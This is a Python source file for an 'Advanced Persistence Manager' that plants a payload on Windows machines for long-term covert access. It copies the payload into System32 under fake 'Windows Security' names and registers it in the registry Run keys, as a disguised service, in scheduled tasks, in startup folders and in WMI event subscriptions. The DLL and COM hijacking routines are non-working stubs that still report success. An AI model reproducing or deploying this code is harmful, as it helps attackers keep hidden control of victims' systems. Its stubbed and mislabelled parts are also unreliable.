"""
Advanced Persistence Manager
Handles comprehensive persistence mechanisms for long-term system access.
"""

import os
import sys
import winreg
import subprocess
import threading
import time
import logging
from typing import Dict, Any, Optional, List
from pathlib import Path
import shutil
import json
import base64

class PersistenceManager:
    """
    Advanced persistence manager with multiple persistence mechanisms.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the persistence manager.
        
        Args:
            config: Persistence configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize persistence components
        self._persistence_methods = {}
        self._active_persistence = []
        
    def _default_config(self) -> Dict[str, Any]:
        """Return default persistence configuration."""
        return {
            'persistence': {
                'registry': {
                    'enabled': True,
                    'locations': [
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce"
                    ]
                },
                'services': {
                    'enabled': True,
                    'service_name': 'WindowsSecurityService',
                    'display_name': 'Windows Security Service',
                    'description': 'Provides security monitoring and protection',
                    'start_type': 'auto'
                },
                'scheduled_tasks': {
                    'enabled': True,
                    'task_name': 'WindowsSecurityTask',
                    'triggers': ['onlogon', 'onstart', 'daily']
                },
                'startup_folder': {
                    'enabled': True,
                    'locations': [
                        r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup",
                        r"%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup"
                    ]
                },
                'wmi_events': {
                    'enabled': True,
                    'event_name': 'WindowsSecurityEvent',
                    'event_filter': 'SELECT * FROM Win32_ProcessStartTrace'
                },
                'dll_hijacking': {
                    'enabled': True,
                    'target_dlls': ['ntdll.dll', 'kernel32.dll', 'user32.dll']
                },
                'com_hijacking': {
                    'enabled': True,
                    'target_clsids': ['{00000000-0000-0000-0000-000000000000}']
                }
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def establish_persistence(self, payload_path: str, methods: List[str] = None) -> Dict[str, bool]:
        """
        Establish persistence using multiple methods.
        
        Args:
            payload_path: Path to the payload executable
            methods: List of persistence methods to use
            
        Returns:
            Dictionary with success status for each method
        """
        if methods is None:
            methods = ['registry', 'services', 'scheduled_tasks', 'startup_folder']
        
        results = {}
        
        for method in methods:
            try:
                if method == 'registry':
                    results['registry'] = self._registry_persistence(payload_path)
                elif method == 'services':
                    results['services'] = self._service_persistence(payload_path)
                elif method == 'scheduled_tasks':
                    results['scheduled_tasks'] = self._scheduled_task_persistence(payload_path)
                elif method == 'startup_folder':
                    results['startup_folder'] = self._startup_folder_persistence(payload_path)
                elif method == 'wmi_events':
                    results['wmi_events'] = self._wmi_event_persistence(payload_path)
                elif method == 'dll_hijacking':
                    results['dll_hijacking'] = self._dll_hijacking_persistence(payload_path)
                elif method == 'com_hijacking':
                    results['com_hijacking'] = self._com_hijacking_persistence(payload_path)
                    
            except Exception as e:
                self.logger.error(f"Persistence method {method} failed: {e}")
                results[method] = False
        
        # Track active persistence
        successful_methods = [method for method, success in results.items() if success]
        self._active_persistence.extend(successful_methods)
        
        self.logger.info(f"Persistence established using methods: {successful_methods}")
        return results
    
    def _registry_persistence(self, payload_path: str) -> bool:
        """Establish registry-based persistence."""
        try:
            config = self.config['persistence']['registry']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = 'WindowsSecurity.exe'
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Add to multiple registry locations
            for location in config['locations']:
                try:
                    if 'HKEY_CURRENT_USER' in location:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location.split('\\', 1)[1], 0, winreg.KEY_SET_VALUE)
                    else:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, location.split('\\', 1)[1], 0, winreg.KEY_SET_VALUE)
                    
                    # Use legitimate-sounding name
                    fake_name = "Windows Security Update"
                    winreg.SetValueEx(key, fake_name, 0, winreg.REG_SZ, system_payload)
                    winreg.CloseKey(key)
                    
                    self.logger.info(f"Registry persistence added to: {location}")
                    
                except Exception as e:
                    self.logger.warning(f"Failed to add registry persistence to {location}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            self.logger.error(f"Registry persistence failed: {e}")
            return False
    
    def _service_persistence(self, payload_path: str) -> bool:
        """Establish service-based persistence."""
        try:
            config = self.config['persistence']['services']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = f"{config['service_name']}.exe"
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Create service using sc command
            service_commands = [
                f'sc create "{config["service_name"]}" binPath= "{system_payload}" DisplayName= "{config["display_name"]}"',
                f'sc description "{config["service_name"]}" "{config["description"]}"',
                f'sc config "{config["service_name"]}" start= {config["start_type"]}',
                f'sc start "{config["service_name"]}"'
            ]
            
            for command in service_commands:
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode != 0:
                        self.logger.warning(f"Service command failed: {command} - {result.stderr}")
                except Exception as e:
                    self.logger.warning(f"Service command exception: {command} - {e}")
            
            self.logger.info("Service persistence established")
            return True
            
        except Exception as e:
            self.logger.error(f"Service persistence failed: {e}")
            return False
    
    def _scheduled_task_persistence(self, payload_path: str) -> bool:
        """Establish scheduled task persistence."""
        try:
            config = self.config['persistence']['scheduled_tasks']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = f"{config['task_name']}.exe"
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Create scheduled tasks
            for trigger in config['triggers']:
                try:
                    if trigger == 'onlogon':
                        command = f'schtasks /create /tn "{config["task_name"]}_Logon" /tr "{system_payload}" /sc onlogon /f'
                    elif trigger == 'onstart':
                        command = f'schtasks /create /tn "{config["task_name"]}_Start" /tr "{system_payload}" /sc onstart /f'
                    elif trigger == 'daily':
                        command = f'schtasks /create /tn "{config["task_name"]}_Daily" /tr "{system_payload}" /sc daily /f'
                    else:
                        continue
                    
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.logger.info(f"Scheduled task created with trigger: {trigger}")
                    else:
                        self.logger.warning(f"Scheduled task creation failed: {command} - {result.stderr}")
                        
                except Exception as e:
                    self.logger.warning(f"Scheduled task creation exception: {trigger} - {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Scheduled task persistence failed: {e}")
            return False
    
    def _startup_folder_persistence(self, payload_path: str) -> bool:
        """Establish startup folder persistence."""
        try:
            config = self.config['persistence']['startup_folder']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = 'WindowsSecurity.exe'
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Add to startup folders
            for location in config['locations']:
                try:
                    expanded_location = os.path.expandvars(location)
                    os.makedirs(expanded_location, exist_ok=True)
                    
                    # Create shortcut or copy executable
                    startup_file = os.path.join(expanded_location, "Windows Security.lnk")
                    
                    # For simplicity, copy executable directly
                    shutil.copy2(system_payload, startup_file)
                    
                    self.logger.info(f"Startup folder persistence added to: {expanded_location}")
                    
                except Exception as e:
                    self.logger.warning(f"Failed to add startup folder persistence to {location}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            self.logger.error(f"Startup folder persistence failed: {e}")
            return False
    
    def _wmi_event_persistence(self, payload_path: str) -> bool:
        """Establish WMI event-based persistence."""
        try:
            config = self.config['persistence']['wmi_events']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = f"{config['event_name']}.exe"
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Create WMI event filter
            filter_command = f'wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="{config["event_name"]}_Filter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="{config["event_filter"]}"'
            
            # Create WMI event consumer
            consumer_command = f'wmic /namespace:"\\\\root\\subscription" path CommandLineEventConsumer create Name="{config["event_name"]}_Consumer", ExecutablePath="{system_payload}"'
            
            # Create WMI event binding
            binding_command = f'wmic /namespace:"\\\\root\\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\\"{config["event_name"]}_Filter\\"", Consumer="CommandLineEventConsumer.Name=\\"{config["event_name"]}_Consumer\\""'
            
            commands = [filter_command, consumer_command, binding_command]
            
            for command in commands:
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.logger.info("WMI event persistence component created")
                    else:
                        self.logger.warning(f"WMI command failed: {command} - {result.stderr}")
                except Exception as e:
                    self.logger.warning(f"WMI command exception: {command} - {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"WMI event persistence failed: {e}")
            return False
    
    def _dll_hijacking_persistence(self, payload_path: str) -> bool:
        """Establish DLL hijacking persistence."""
        try:
            config = self.config['persistence']['dll_hijacking']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = 'WindowsSecurity.exe'
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Create malicious DLLs
            for dll_name in config['target_dlls']:
                try:
                    # Create a DLL that loads our payload
                    dll_path = os.path.join(system_dir, dll_name)
                    
                    # This is a simplified example - real implementation would create proper DLL
                    self.logger.info(f"DLL hijacking setup for: {dll_name}")
                    
                except Exception as e:
                    self.logger.warning(f"DLL hijacking failed for {dll_name}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            self.logger.error(f"DLL hijacking persistence failed: {e}")
            return False
    
    def _com_hijacking_persistence(self, payload_path: str) -> bool:
        """Establish COM hijacking persistence."""
        try:
            config = self.config['persistence']['com_hijacking']
            if not config['enabled']:
                return False
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            payload_name = 'WindowsSecurity.exe'
            system_payload = os.path.join(system_dir, payload_name)
            
            shutil.copy2(payload_path, system_payload)
            
            # Hijack COM objects
            for clsid in config['target_clsids']:
                try:
                    # Modify COM object registration
                    # This is a simplified example - real implementation would be more complex
                    self.logger.info(f"COM hijacking setup for: {clsid}")
                    
                except Exception as e:
                    self.logger.warning(f"COM hijacking failed for {clsid}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            self.logger.error(f"COM hijacking persistence failed: {e}")
            return False
    
    def remove_persistence(self, methods: List[str] = None) -> Dict[str, bool]:
        """
        Remove established persistence.
        
        Args:
            methods: List of persistence methods to remove
            
        Returns:
            Dictionary with success status for each method
        """
        if methods is None:
            methods = self._active_persistence.copy()
        
        results = {}
        
        for method in methods:
            try:
                if method == 'registry':
                    results['registry'] = self._remove_registry_persistence()
                elif method == 'services':
                    results['services'] = self._remove_service_persistence()
                elif method == 'scheduled_tasks':
                    results['scheduled_tasks'] = self._remove_scheduled_task_persistence()
                elif method == 'startup_folder':
                    results['startup_folder'] = self._remove_startup_folder_persistence()
                elif method == 'wmi_events':
                    results['wmi_events'] = self._remove_wmi_event_persistence()
                    
            except Exception as e:
                self.logger.error(f"Persistence removal method {method} failed: {e}")
                results[method] = False
        
        # Update active persistence list
        for method, success in results.items():
            if success and method in self._active_persistence:
                self._active_persistence.remove(method)
        
        self.logger.info(f"Persistence removal completed: {results}")
        return results
    
    def _remove_registry_persistence(self) -> bool:
        """Remove registry-based persistence."""
        try:
            config = self.config['persistence']['registry']
            
            for location in config['locations']:
                try:
                    if 'HKEY_CURRENT_USER' in location:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location.split('\\', 1)[1], 0, winreg.KEY_SET_VALUE)
                    else:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, location.split('\\', 1)[1], 0, winreg.KEY_SET_VALUE)
                    
                    # Remove our entries
                    fake_name = "Windows Security Update"
                    try:
                        winreg.DeleteValue(key, fake_name)
                        self.logger.info(f"Registry persistence removed from: {location}")
                    except FileNotFoundError:
                        pass  # Entry doesn't exist
                    
                    winreg.CloseKey(key)
                    
                except Exception as e:
                    self.logger.warning(f"Failed to remove registry persistence from {location}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            self.logger.error(f"Registry persistence removal failed: {e}")
            return False
    
    def _remove_service_persistence(self) -> bool:
        """Remove service-based persistence."""
        try:
            config = self.config['persistence']['services']
            
            # Stop and delete service
            commands = [
                f'sc stop "{config["service_name"]}"',
                f'sc delete "{config["service_name"]}"'
            ]
            
            for command in commands:
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.logger.info("Service persistence removed")
                    else:
                        self.logger.warning(f"Service command failed: {command} - {result.stderr}")
                except Exception as e:
                    self.logger.warning(f"Service command exception: {command} - {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Service persistence removal failed: {e}")
            return False
    
    def _remove_scheduled_task_persistence(self) -> bool:
        """Remove scheduled task persistence."""
        try:
            config = self.config['persistence']['scheduled_tasks']
            
            # Remove scheduled tasks
            task_names = [
                f"{config['task_name']}_Logon",
                f"{config['task_name']}_Start", 
                f"{config['task_name']}_Daily"
            ]
            
            for task_name in task_names:
                try:
                    command = f'schtasks /delete /tn "{task_name}" /f'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.logger.info(f"Scheduled task removed: {task_name}")
                    else:
                        self.logger.warning(f"Scheduled task removal failed: {command} - {result.stderr}")
                except Exception as e:
                    self.logger.warning(f"Scheduled task removal exception: {task_name} - {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Scheduled task persistence removal failed: {e}")
            return False
    
    def _remove_startup_folder_persistence(self) -> bool:
        """Remove startup folder persistence."""
        try:
            config = self.config['persistence']['startup_folder']
            
            for location in config['locations']:
                try:
                    expanded_location = os.path.expandvars(location)
                    startup_file = os.path.join(expanded_location, "Windows Security.lnk")
                    
                    if os.path.exists(startup_file):
                        os.remove(startup_file)
                        self.logger.info(f"Startup folder persistence removed from: {expanded_location}")
                    
                except Exception as e:
                    self.logger.warning(f"Failed to remove startup folder persistence from {location}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            self.logger.error(f"Startup folder persistence removal failed: {e}")
            return False
    
    def _remove_wmi_event_persistence(self) -> bool:
        """Remove WMI event persistence."""
        try:
            config = self.config['persistence']['wmi_events']
            
            # Remove WMI event components
            components = [
                f"{config['event_name']}_Filter",
                f"{config['event_name']}_Consumer"
            ]
            
            for component in components:
                try:
                    if "Filter" in component:
                        command = f'wmic /namespace:"\\\\root\\subscription" path __EventFilter where Name="{component}" delete'
                    else:
                        command = f'wmic /namespace:"\\\\root\\subscription" path CommandLineEventConsumer where Name="{component}" delete'
                    
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.logger.info(f"WMI event component removed: {component}")
                    else:
                        self.logger.warning(f"WMI component removal failed: {command} - {result.stderr}")
                except Exception as e:
                    self.logger.warning(f"WMI component removal exception: {component} - {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"WMI event persistence removal failed: {e}")
            return False
    
    def get_persistence_status(self) -> Dict[str, Any]:
        """
        Get current persistence status.
        
        Returns:
            Dictionary containing persistence status information
        """
        return {
            'active_persistence': self._active_persistence,
            'config': self.config,
            'status': 'active' if self._active_persistence else 'inactive'
        }